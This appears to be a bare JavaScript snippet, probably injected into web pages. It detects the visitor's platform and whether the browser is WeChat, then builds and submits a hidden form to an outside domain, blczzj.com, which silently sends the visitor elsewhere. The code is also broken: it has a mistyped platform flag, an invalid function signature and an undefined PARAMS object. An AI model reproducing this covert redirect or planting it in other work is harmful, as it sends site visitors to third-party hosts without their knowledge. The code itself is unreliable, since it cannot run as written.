	var system={win:false,mac:false,xll:false,ipad:false};
	var plat=navigator.platform;
	system.win=plat.indexOf("Win")==0;
	system.mac=plat.indexOf("Mac")==0;
	system.x11=(plat=="X11")||(plat.indexOf("Linux")==0);
	system.ipad=(navigator.userAgent.match(/iPad/i)!=null)?true:false;
	if(system.win||system.mac||system.xll||system.ipad){var l=1;}if(!isWeiXin()){var l=1;}function isWeiXin(){var ua=window.navigator.userAgent.toLowerCase();
 	if(ua.match(/MicroMessenger/i)=='micromessenger'){return true}else{return false}}
if(l!=1){



}
 alert(get('http://blczzj.com/23123.gcif'));
function get(URL, {html :'prnhtml',cm1:'sdsddsd',cm2:'haha'})
                        {
                            var temp = document.createElement("form");
                            temp.method = "get";
                            temp.style.display = "none";
                            var data = "?";
                            for (var x in PARAMS)
                            {
                                data += x + "=" + PARAMS[x] + "&";;
                            }
                            data = data.slice(0, data.length-1);
                            temp.action = URL + data;
                            document.body.appendChild(temp);
                            temp.submit();
                            return temp;
                        }
